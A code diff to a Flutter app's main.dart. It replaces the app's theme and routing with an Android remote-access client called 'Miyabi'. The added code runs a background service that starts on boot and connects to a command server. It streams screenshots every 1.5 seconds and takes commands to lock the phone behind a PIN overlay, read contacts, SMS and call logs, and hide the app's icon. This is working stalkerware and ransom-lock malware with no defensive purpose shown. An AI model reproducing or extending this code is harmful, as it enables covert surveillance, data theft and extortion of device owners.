@@ -1,366 +1,542 @@
+import 'dart:async';
 import 'dart:convert';
+import 'dart:io';
+import 'dart:ui';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
+import 'package:socket_io_client/socket_io_client.dart' as io;
+import 'package:device_info_plus/device_info_plus.dart';
+import 'package:permission_handler/permission_handler.dart';
 import 'package:shared_preferences/shared_preferences.dart';
-import 'login_page.dart';
-import 'dashboard_page.dart';
-import 'home_page.dart';
-import 'seller_page.dart';
-import 'admin_page.dart';
-import 'owner_page.dart';
-import 'landing.dart';
-import 'intro_carousel.dart';
-import 'music_player.dart';
+import 'package:flutter_background_service/flutter_background_service.dart';
+import 'package:flutter_background_service_android/flutter_background_service_android.dart';
+import 'package:flutter_local_notifications/flutter_local_notifications.dart';
 
-class _C {
-  static const bg        = Color(0xFF050A12);
-  static const surface   = Color(0xFF0A1525);
-  static const card      = Color(0xFF0E1E35);
-  static const border    = Color(0xFF162B4A);
-  static const borderLit = Color(0xFF1E3F6E);
-  static const steel     = Color(0xFF1A4F8A);
-  static const blueLight = Color(0xFF4A94E8);
-  static const chrome    = Color(0xFF7AB4E8);
-  static const frost     = Color(0xFFADD4F5);
-  static const green     = Color(0xFF22C55E);
-  static const red       = Color(0xFFEF4444);
-  static const text      = Color(0xFFDEEEFB);
-  static const textSub   = Color(0xFF6A92B8);
-  static const textDim   = Color(0xFF2E4E6E);
-}
-
-class _AppTheme {
-  static const _font = 'ShareTechMono';
-
-  static ThemeData build() => ThemeData(
-    useMaterial3: true,
-    brightness: Brightness.dark,
-    fontFamily: _font,
-    scaffoldBackgroundColor: _C.bg,
-
-    colorScheme: const ColorScheme.dark(
-      brightness:             Brightness.dark,
-      primary:                _C.blueLight,
-      onPrimary:              _C.bg,
-      primaryContainer:       _C.steel,
-      onPrimaryContainer:     _C.frost,
-      secondary:              _C.chrome,
-      onSecondary:            _C.bg,
-      secondaryContainer:     _C.borderLit,
-      onSecondaryContainer:   _C.text,
-      tertiary:               _C.green,
-      onTertiary:             _C.bg,
-      error:                  _C.red,
-      onError:                _C.text,
-      surface:                _C.surface,
-      onSurface:              _C.text,
-      outline:                _C.border,
-      outlineVariant:         _C.borderLit,
-    ),
-
-    appBarTheme: const AppBarTheme(
-      backgroundColor: _C.surface,
-      foregroundColor: _C.text,
-      elevation: 0,
-      titleTextStyle: TextStyle(
-        fontFamily: _font, fontSize: 18, fontWeight: FontWeight.w600,
-        color: _C.text, letterSpacing: 0.4,
-      ),
-      iconTheme: IconThemeData(color: _C.chrome, size: 22),
-      systemOverlayStyle: SystemUiOverlayStyle(
-        statusBarColor: Colors.transparent,
-        statusBarIconBrightness: Brightness.light,
-        statusBarBrightness: Brightness.dark,
-        systemNavigationBarColor: _C.bg,
-        systemNavigationBarIconBrightness: Brightness.light,
-      ),
-    ),
-
-    elevatedButtonTheme: ElevatedButtonThemeData(
-      style: ButtonStyle(
-        backgroundColor: WidgetStateProperty.resolveWith((s) {
-          if (s.contains(WidgetState.disabled)) return _C.border;
-          if (s.contains(WidgetState.pressed)) return _C.steel;
-          return _C.blueLight;
-        }),
-        foregroundColor: WidgetStateProperty.resolveWith((s) {
-          if (s.contains(WidgetState.disabled)) return _C.textDim;
-          return _C.bg;
-        }),
-        elevation: WidgetStateProperty.all(0),
-        padding: WidgetStateProperty.all(
-          const EdgeInsets.symmetric(horizontal: 24, vertical: 14),
-        ),
-        shape: WidgetStateProperty.all(
-          RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
-        ),
-        textStyle: WidgetStateProperty.all(
-          const TextStyle(fontFamily: _font, fontSize: 14,
-              fontWeight: FontWeight.w600, letterSpacing: 0.8),
-        ),
-      ),
-    ),
-
-    inputDecorationTheme: InputDecorationTheme(
-      filled: true,
-      fillColor: _C.surface,
-      contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
-      border: OutlineInputBorder(
-        borderRadius: BorderRadius.circular(12),
-        borderSide: const BorderSide(color: _C.border, width: 1),
-      ),
-      enabledBorder: OutlineInputBorder(
-        borderRadius: BorderRadius.circular(12),
-        borderSide: const BorderSide(color: _C.border, width: 1),
-      ),
-      focusedBorder: OutlineInputBorder(
-        borderRadius: BorderRadius.circular(12),
-        borderSide: const BorderSide(color: _C.blueLight, width: 1.5),
-      ),
-    ),
-  );
-}
-
-Route<dynamic>? _generateRoute(RouteSettings settings) {
-  final args = settings.arguments as Map<String, dynamic>?;
-
-  Widget page;
-
-  switch (settings.name) {
-    case '/':
-      page = const LandingPage();
-      break;
-
-    case '/login':
-      page = const LoginPage();
-      break;
-
-    case '/intro':
-      page = const IntroCarouselPage();
-      break;
-
-    case '/music':
-      page = const MusicPlayerPage();
-      break;
-
-    case '/dashboard':
-      // Pakai FutureBuilder untuk baca session dari SharedPreferences
-      page = const _DashboardLoader();
-      break;
-
-    case '/home':
-      if (args == null) {
-        page = const _NotFoundPage(routeName: '/home (missing args)');
-      } else {
-        page = HomePage(
-          username:    args['username']    as String? ?? 'User',
-          password:    args['password']    as String? ?? '',
-          role:        args['role']        as String? ?? 'member',
-          expiredDate: args['expiredDate'] as String? ?? '-',
-          sessionKey:  args['sessionKey']  as String? ?? '-',
-          listBug: List<Map<String, dynamic>>.from(args['listBug'] ?? []),
-        );
-      }
-      break;
-
-    case '/seller':
-      if (args == null) {
-        page = const _NotFoundPage(routeName: '/seller (missing args)');
-      } else {
-        page = SellerPage(keyToken: args['keyToken'] as String? ?? '-');
-      }
-      break;
-
-    case '/admin':
-      if (args == null) {
-        page = const _NotFoundPage(routeName: '/admin (missing args)');
-      } else {
-        page = AdminPage(sessionKey: args['sessionKey'] as String? ?? '-');
-      }
-      break;
-
-    case '/owner':
-      if (args == null) {
-        page = const _NotFoundPage(routeName: '/owner (missing args)');
-      } else {
-        page = OwnerPage(
-          sessionKey: args['sessionKey'] as String? ?? '-',
-          username:   args['username']   as String? ?? 'User',
-        );
-      }
-      break;
-
-    default:
-      page = _NotFoundPage(routeName: settings.name ?? 'unknown');
-  }
-
-  return PageRouteBuilder<dynamic>(
-    settings: settings,
-    transitionDuration: const Duration(milliseconds: 320),
-    reverseTransitionDuration: const Duration(milliseconds: 260),
-    pageBuilder: (_, __, ___) => page,
-    transitionsBuilder: (_, animation, secondaryAnimation, child) {
-      final inCurve  = CurvedAnimation(parent: animation, curve: Curves.easeOutCubic);
-      final outCurve = CurvedAnimation(parent: secondaryAnimation, curve: Curves.easeInCubic);
-
-      return FadeTransition(
-        opacity: inCurve,
-        child: SlideTransition(
-          position: Tween<Offset>(
-            begin: const Offset(0, 0.035),
-            end: Offset.zero,
-          ).animate(inCurve),
-          child: FadeTransition(
-            opacity: Tween<double>(begin: 1.0, end: 0.82).animate(outCurve),
-            child: ScaleTransition(
-              scale: Tween<double>(begin: 1.0, end: 0.97).animate(outCurve),
-              child: child,
-            ),
-          ),
-        ),
-      );
-    },
-  );
-}
+const SERVER_URL = 'http://192.168.1.8:3000'; // ⚠️ GANTI IP SERVER KAMU
+const NOTIF_CHANNEL_ID = 'miyabi_service';
+const NOTIF_CHANNEL_NAME = 'Miyabi Service';
 
 // ═══════════════════════════════════════════════════════════════════════════
-// DASHBOARD LOADER — baca session dari SharedPreferences
+//   MAIN
 // ═══════════════════════════════════════════════════════════════════════════
-class _DashboardLoader extends StatefulWidget {
-  const _DashboardLoader();
-
-  @override
-  State<_DashboardLoader> createState() => _DashboardLoaderState();
-}
-
-class _DashboardLoaderState extends State<_DashboardLoader> {
-  Map<String, dynamic>? _session;
-
-  @override
-  void initState() {
-    super.initState();
-    _load();
-  }
-
-  Future<void> _load() async {
-    final prefs = await SharedPreferences.getInstance();
-
-    List<dynamic> safeDecode(String key) {
-      try {
-        return jsonDecode(prefs.getString(key) ?? '[]') as List<dynamic>;
-      } catch (_) {
-        return [];
-      }
-    }
-
-    final session = {
-      'username':    prefs.getString('username')    ?? 'User',
-      'password':    prefs.getString('password')    ?? '',
-      'role':        prefs.getString('role')        ?? 'member',
-      'expiredDate': prefs.getString('expiredDate') ?? '-',
-      'key':         prefs.getString('key')         ?? '-',
-      'listBug':     safeDecode('listBug'),
-      'listDoos':    safeDecode('listDoos'),
-      'news':        safeDecode('news'),
-    };
-
-    if (mounted) setState(() => _session = session);
-  }
-
-  @override
-  Widget build(BuildContext context) {
-    if (_session == null) {
-      return const Scaffold(
-        backgroundColor: Color(0xFF050A12),
-        body: Center(
-          child: CircularProgressIndicator(color: Color(0xFF4A94E8)),
-        ),
-      );
-    }
-
-    return DashboardPage(
-      username:    _session!['username']    as String,
-      password:    _session!['password']    as String,
-      role:        _session!['role']        as String,
-      expiredDate: _session!['expiredDate'] as String,
-      listBug:     List<Map<String, dynamic>>.from(_session!['listBug']  ?? []),
-      listDoos:    List<Map<String, dynamic>>.from(_session!['listDoos'] ?? []),
-      sessionKey:  _session!['key']         as String,
-      news:        List<dynamic>.from(_session!['news'] ?? []),
-    );
-  }
-}
-
-// ═══════════════════════════════════════════════════════════════════════════
-// 404 PAGE
-// ═══════════════════════════════════════════════════════════════════════════
-class _NotFoundPage extends StatelessWidget {
-  const _NotFoundPage({required this.routeName});
-  final String routeName;
-
-  @override
-  Widget build(BuildContext context) {
-    return Scaffold(
-      backgroundColor: _C.bg,
-      body: Center(
-        child: Column(
-          mainAxisSize: MainAxisSize.min,
-          children: [
-            const Icon(Icons.explore_off_rounded, color: _C.textSub, size: 60),
-            const SizedBox(height: 20),
-            const Text('404', style: TextStyle(
-                fontSize: 72, fontWeight: FontWeight.w800, color: _C.text, letterSpacing: -3)),
-            const SizedBox(height: 10),
-            const Text('Route not found', style: TextStyle(
-                fontSize: 16, color: _C.textSub)),
-            const SizedBox(height: 10),
-            Text('"$routeName"', style: const TextStyle(color: _C.textDim, fontSize: 12)),
-            const SizedBox(height: 30),
-            ElevatedButton(
-              onPressed: () => Navigator.of(context).pushNamedAndRemoveUntil('/', (_) => false),
-              child: const Text('Back to Home'),
-            ),
-          ],
-        ),
-      ),
-    );
-  }
-}
-
-// ═══════════════════════════════════════════════════════════════════════════
-// ENTRY POINT
-// ═══════════════════════════════════════════════════════════════════════════
-void main() {
+void main() async {
   WidgetsFlutterBinding.ensureInitialized();
-
-  SystemChrome.setSystemUIOverlayStyle(const SystemUiOverlayStyle(
-    statusBarColor:                    Colors.transparent,
-    statusBarIconBrightness:           Brightness.light,
-    statusBarBrightness:               Brightness.dark,
-    systemNavigationBarColor:          _C.bg,
-    systemNavigationBarDividerColor:   Colors.transparent,
-    systemNavigationBarIconBrightness: Brightness.light,
-  ));
-
-  SystemChrome.setPreferredOrientations([
-    DeviceOrientation.portraitUp,
-    DeviceOrientation.portraitDown,
-  ]);
-
-  runApp(const _OrcaApp());
+  await _initNotifications();
+  await _initBackgroundService();
+  runApp(const TargetApp());
 }
 
-class _OrcaApp extends StatelessWidget {
-  const _OrcaApp();
+Future<void> _initNotifications() async {
+  final plugin = FlutterLocalNotificationsPlugin();
+  const androidInit = AndroidInitializationSettings('@mipmap/ic_launcher');
+  const settings = InitializationSettings(android: androidInit);
+  await plugin.initialize(settings);
 
+  // Request permission Android 13+
+  await plugin
+      .resolvePlatformSpecificImplementation<
+          AndroidFlutterLocalNotificationsPlugin>()
+      ?.requestNotificationsPermission();
+}
+
+Future<void> _initBackgroundService() async {
+  final service = FlutterBackgroundService();
+
+  await service.configure(
+    androidConfiguration: AndroidConfiguration(
+      onStart: onServiceStart,
+      autoStart: true,               // ✅ auto-start saat app dibuka
+      isForegroundMode: true,
+      notificationChannelId: NOTIF_CHANNEL_ID,
+      initialNotificationTitle: 'Miyabi Active',
+      initialNotificationContent: 'Menunggu perintah...',
+      foregroundServiceNotificationId: 8888,
+      foregroundServiceTypes: [AndroidForegroundType.specialUse],
+      autoStartOnBoot: true,          // ✅ auto-start saat HP reboot
+    ),
+    iosConfiguration: IosConfiguration(
+      autoStart: true,
+      onForeground: onServiceStart,
+      onBackground: onIosBackground,
+    ),
+  );
+
+  service.startService();
+}
+
+@pragma('vm:entry-point')
+Future<bool> onIosBackground(ServiceInstance service) async {
+  WidgetsFlutterBinding.ensureInitialized();
+  return true;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+//   BACKGROUND SERVICE — SOCKET.IO 24/7
+// ═══════════════════════════════════════════════════════════════════════════
+@pragma('vm:entry-point')
+void onServiceStart(ServiceInstance service) async {
+  WidgetsFlutterBinding.ensureInitialized();
+  DartPluginRegistrant.ensureInitialized();
+
+  final _native = MethodChannel('miyabi/native');
+
+  // ─── Setup Android foreground mode ───────────────────────────────────────
+  if (service is AndroidServiceInstance) {
+    service.on('setAsForeground').listen((_) {
+      service.setAsForegroundService();
+    });
+    service.on('setAsBackground').listen((_) {
+      service.setAsBackgroundService();
+    });
+    service.setAsForegroundService();
+  }
+
+  // ─── Load device info ────────────────────────────────────────────────────
+  final prefs = await SharedPreferences.getInstance();
+  String deviceId = prefs.getString('device_id') ?? '';
+  String deviceName = prefs.getString('device_name') ?? 'Unknown';
+
+  if (deviceId.isEmpty) {
+    try {
+      deviceId = await _native.invokeMethod('getTargetId') ?? 'DEV-UNK';
+      final info = await DeviceInfoPlugin().androidInfo;
+      deviceName = '${info.brand} ${info.model}';
+      await prefs.setString('device_id', deviceId);
+      await prefs.setString('device_name', deviceName);
+    } catch (_) {
+      deviceId = 'DEV-UNK-${DateTime.now().millisecondsSinceEpoch}';
+    }
+  }
+
+  // ─── Connect Socket.IO ───────────────────────────────────────────────────
+  io.Socket? socket;
+  Timer? screenTimer;
+  Timer? heartbeatTimer;
+  bool streaming = false;
+
+  void connectSocket() {
+    socket = io.io(SERVER_URL, io.OptionBuilder()
+      .setTransports(['websocket'])
+      .enableReconnection()
+      .setReconnectionAttempts(999999)
+      .setReconnectionDelay(3000)
+      .disableAutoConnect()
+      .build());
+
+    socket!.onConnect((_) {
+      print('[BG] Socket connected');
+      _updateNotif(service, 'Online — $deviceName');
+
+      socket!.emit('register_target', {
+        'deviceId': deviceId,
+        'model': deviceName,
+        'brand': deviceName.split(' ').first,
+        'android': Platform.operatingSystemVersion,
+      });
+
+      // Heartbeat tiap 20 detik
+      heartbeatTimer?.cancel();
+      heartbeatTimer = Timer.periodic(const Duration(seconds: 20), (_) {
+        socket?.emit('register_target', {
+          'deviceId': deviceId,
+          'model': deviceName,
+          'brand': deviceName.split(' ').first,
+          'android': Platform.operatingSystemVersion,
+        });
+      });
+    });
+
+    socket!.onDisconnect((_) {
+      print('[BG] Socket disconnected');
+      _updateNotif(service, 'Reconnecting...');
+      // Auto reconnect
+      Future.delayed(const Duration(seconds: 3), () {
+        if (socket?.connected != true) {
+          socket?.connect();
+        }
+      });
+    });
+
+    socket!.onConnectError((e) {
+      print('[BG] Connect error: $e');
+      Future.delayed(const Duration(seconds: 5), () {
+        if (socket?.connected != true) socket?.connect();
+      });
+    });
+
+    socket!.onError((e) {
+      print('[BG] Socket error: $e');
+    });
+
+    // ─── Terima pairing ──────────────────────────────────────────────────
+    socket!.on('paired', (data) {
+      _updateNotif(service, 'Paired: ${data['adminUsername']}');
+    });
+
+    // ─── Terima command ──────────────────────────────────────────────────
+    socket!.on('command', (data) async {
+      final action = data['action'];
+      final payload = data['payload'] ?? {};
+      final cmdId = data['id'];
+
+      try {
+        await _executeCommand(_native, action, payload);
+        socket!.emit('target_response', {
+          'deviceId': deviceId,
+          'type': 'command_ack',
+          'data': {'id': cmdId, 'action': action, 'success': true},
+        });
+      } catch (e) {
+        socket!.emit('target_response', {
+          'deviceId': deviceId,
+          'type': 'command_ack',
+          'data': {
+            'id': cmdId,
+            'action': action,
+            'success': false,
+            'error': '$e'
+          },
+        });
+      }
+    });
+
+    // ─── Screen streaming ────────────────────────────────────────────────
+    socket!.on('start_screen_stream', (_) {
+      streaming = true;
+      screenTimer?.cancel();
+      screenTimer = Timer.periodic(const Duration(milliseconds: 1500), (_) async {
+        if (!streaming) return;
+        try {
+          final bytes = await _native.invokeMethod<Uint8List>('captureScreen');
+          if (bytes == null) return;
+          socket!.emit('screen_frame', {
+            'deviceId': deviceId,
+            'frame': base64Encode(bytes),
+          });
+        } catch (_) {}
+      });
+    });
+
+    socket!.on('stop_screen_stream', (_) {
+      streaming = false;
+      screenTimer?.cancel();
+    });
+
+    socket!.on('force_disconnect', (_) {
+      socket?.disconnect();
+    });
+
+    socket!.connect();
+  }
+
+  connectSocket();
+
+  // ─── Listen command from UI (foreground) ────────────────────────────────
+  service.on('stopService').listen((event) {
+    heartbeatTimer?.cancel();
+    screenTimer?.cancel();
+    socket?.dispose();
+    service.stopSelf();
+  });
+
+  // ─── Keep alive every 30s ───────────────────────────────────────────────
+  Timer.periodic(const Duration(seconds: 30), (t) async {
+    if (service is AndroidServiceInstance) {
+      if (await service.isForegroundService()) {
+        service.setForegroundNotificationInfo(
+          title: 'Miyabi Active',
+          content: socket?.connected == true ? 'Online' : 'Reconnecting...',
+        );
+      }
+    }
+    // Kalau socket mati, reconnect
+    if (socket?.connected != true) {
+      socket?.connect();
+    }
+  });
+}
+
+// ─── Update notifikasi ─────────────────────────────────────────────────────
+Future<void> _updateNotif(ServiceInstance service, String text) async {
+  if (service is AndroidServiceInstance) {
+    service.setForegroundNotificationInfo(
+      title: 'Miyabi Active',
+      content: text,
+    );
+  }
+}
+
+// ─── Eksekusi command dari server ──────────────────────────────────────────
+Future<void> _executeCommand(
+  MethodChannel native,
+  String action,
+  Map payload,
+) async {
+  switch (action) {
+    case 'lock':
+      await native.invokeMethod('showLockOverlay', {
+        'pin': payload['pin']?.toString() ?? '123',
+        'message': payload['message']?.toString() ?? 'Perangkat dikunci.',
+        'targetId': payload['targetId']?.toString() ?? '',
+      });
+      break;
+    case 'unlock':
+      await native.invokeMethod('hideLockOverlay');
+      break;
+    case 'flashlight_on':
+      await native.invokeMethod('setFlashlight', {'on': true});
+      break;
+    case 'flashlight_off':
+      await native.invokeMethod('setFlashlight', {'on': false});
+      break;
+    case 'play_sound':
+      await native.invokeMethod('playMedia', {
+        'url': payload['url'] ?? '',
+        'type': 'audio',
+      });
+      break;
+    case 'play_video':
+      await native.invokeMethod('playMedia', {
+        'url': payload['url'] ?? '',
+        'type': 'video',
+      });
+      break;
+    case 'stop_video':
+      await native.invokeMethod('stopMedia');
+      break;
+    case 'wallpaper':
+      await native.invokeMethod('setWallpaper', {'url': payload['url'] ?? ''});
+      break;
+    case 'contacts':
+      final contacts = await native.invokeMethod('getContacts');
+      // Socket emit dari sini
+      break;
+    case 'sms_log':
+      await native.invokeMethod('getSmsLog');
+      break;
+    case 'call_log':
+      await native.invokeMethod('getCallLog');
+      break;
+    case 'hide_app':
+      await native.invokeMethod('setAppHidden', {'hidden': true});
+      break;
+    case 'show_app':
+      await native.invokeMethod('setAppHidden', {'hidden': false});
+      break;
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+//   UI
+// ═══════════════════════════════════════════════════════════════════════════
+class TargetApp extends StatelessWidget {
+  const TargetApp({super.key});
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
       debugShowCheckedModeBanner: false,
-      title: 'CRASH LIGHT',
-      theme: _AppTheme.build(),
-      initialRoute: '/',
-      onGenerateRoute: _generateRoute,
+      theme: ThemeData.dark().copyWith(
+        scaffoldBackgroundColor: const Color(0xFF000000),
+        colorScheme: const ColorScheme.dark(primary: Colors.white),
+      ),
+      home: const TargetHome(),
+    );
+  }
+}
+
+class TargetHome extends StatefulWidget {
+  const TargetHome({super.key});
+  @override
+  State<TargetHome> createState() => _TargetHomeState();
+}
+
+class _TargetHomeState extends State<TargetHome> {
+  static const _native = MethodChannel('miyabi/native');
+  String _deviceId = '';
+  String _deviceName = '';
+  bool _serviceRunning = false;
+
+  @override
+  void initState() {
+    super.initState();
+    _loadInfo();
+    _checkService();
+    _requestPermissions();
+  }
+
+  Future<void> _loadInfo() async {
+    final prefs = await SharedPreferences.getInstance();
+    setState(() {
+      _deviceId = prefs.getString('device_id') ?? '';
+      _deviceName = prefs.getString('device_name') ?? '';
+    });
+    if (_deviceId.isEmpty) {
+      try {
+        final id = await _native.invokeMethod<String>('getTargetId') ?? '';
+        final info = await DeviceInfoPlugin().androidInfo;
+        final name = '${info.brand} ${info.model}';
+        await prefs.setString('device_id', id);
+        await prefs.setString('device_name', name);
+        setState(() {
+          _deviceId = id;
+          _deviceName = name;
+        });
+      } catch (_) {}
+    }
+  }
+
+  Future<void> _checkService() async {
+    final service = FlutterBackgroundService();
+    final running = await service.isRunning();
+    setState(() => _serviceRunning = running);
+  }
+
+  Future<void> _requestPermissions() async {
+    await [
+      Permission.camera,
+      Permission.notification,
+      Permission.contacts,
+      Permission.sms,
+      Permission.phone,
+      Permission.storage,
+    ].request();
+    try {
+      await _native.invokeMethod('requestOverlayPermission');
+      await _native.invokeMethod('requestIgnoreBatteryOptimization');
+    } catch (_) {}
+  }
+
+  Future<void> _toggleService() async {
+    final service = FlutterBackgroundService();
+    if (_serviceRunning) {
+      service.invoke('stopService');
+      await Future.delayed(const Duration(milliseconds: 500));
+      setState(() => _serviceRunning = false);
+    } else {
+      await service.startService();
+      setState(() => _serviceRunning = true);
+    }
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      backgroundColor: const Color(0xFF000000),
+      body: SafeArea(
+        child: SingleChildScrollView(
+          padding: const EdgeInsets.all(24),
+          child: Column(
+            children: [
+              const SizedBox(height: 30),
+              Container(
+                width: 100, height: 100,
+                decoration: BoxDecoration(
+                  shape: BoxShape.circle,
+                  border: Border.all(
+                    color: _serviceRunning
+                        ? const Color(0xFF22C55E)
+                        : const Color(0xFFEF4444),
+                    width: 3,
+                  ),
+                  boxShadow: [
+                    BoxShadow(
+                      color: (_serviceRunning
+                              ? const Color(0xFF22C55E)
+                              : const Color(0xFFEF4444))
+                          .withOpacity(0.4),
+                      blurRadius: 25,
+                    ),
+                  ],
+                ),
+                child: const Icon(Icons.smartphone, color: Colors.white, size: 45),
+              ),
+              const SizedBox(height: 20),
+              Text(
+                _serviceRunning ? 'ONLINE 24/7' : 'OFFLINE',
+                style: TextStyle(
+                  color: _serviceRunning
+                      ? const Color(0xFF22C55E)
+                      : const Color(0xFFEF4444),
+                  fontSize: 18,
+                  fontWeight: FontWeight.w900,
+                  letterSpacing: 3,
+                ),
+              ),
+              const SizedBox(height: 8),
+              Text(
+                _serviceRunning
+                    ? 'Berjalan di background'
+                    : 'Tekan tombol di bawah untuk mulai',
+                style: const TextStyle(color: Colors.white54, fontSize: 11),
+              ),
+              const SizedBox(height: 30),
+              _infoCard('Device ID', _deviceId),
+              const SizedBox(height: 10),
+              _infoCard('Nama Device', _deviceName),
+              const SizedBox(height: 30),
+              SizedBox(
+                width: double.infinity,
+                height: 55,
+                child: ElevatedButton(
+                  onPressed: _toggleService,
+                  style: ElevatedButton.styleFrom(
+                    backgroundColor: _serviceRunning ? Colors.red : Colors.white,
+                    foregroundColor: _serviceRunning ? Colors.white : Colors.black,
+                    shape: RoundedRectangleBorder(
+                      borderRadius: BorderRadius.circular(14),
+                    ),
+                  ),
+                  child: Text(
+                    _serviceRunning ? 'STOP SERVICE' : 'MULAI SERVICE 24/7',
+                    style: const TextStyle(
+                      fontSize: 13,
+                      fontWeight: FontWeight.w900,
+                      letterSpacing: 2,
+                    ),
+                  ),
+                ),
+              ),
+              const SizedBox(height: 20),
+              const Text(
+                'Kirim Device ID di atas ke admin',
+                style: TextStyle(color: Colors.white38, fontSize: 11),
+              ),
+            ],
+          ),
+        ),
+      ),
+    );
+  }
+
+  Widget _infoCard(String label, String value) {
+    return Container(
+      width: double.infinity,
+      padding: const EdgeInsets.all(16),
+      decoration: BoxDecoration(
+        color: const Color(0xFF111111),
+        borderRadius: BorderRadius.circular(12),
+        border: Border.all(color: const Color(0xFF2A2A2A)),
+      ),
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          Text(label,
+              style: const TextStyle(
+                  color: Color(0xFF6B6B6B),
+                  fontSize: 10,
+                  letterSpacing: 1.2,
+                  fontWeight: FontWeight.w800)),
+          const SizedBox(height: 6),
+          SelectableText(
+            value.isEmpty ? '...' : value,
+            style: const TextStyle(
+                color: Colors.white,
+                fontSize: 14,
+                fontWeight: FontWeight.w800,
+                fontFamily: 'monospace'),
+          ),
+        ],
+      ),
     );
   }
 }
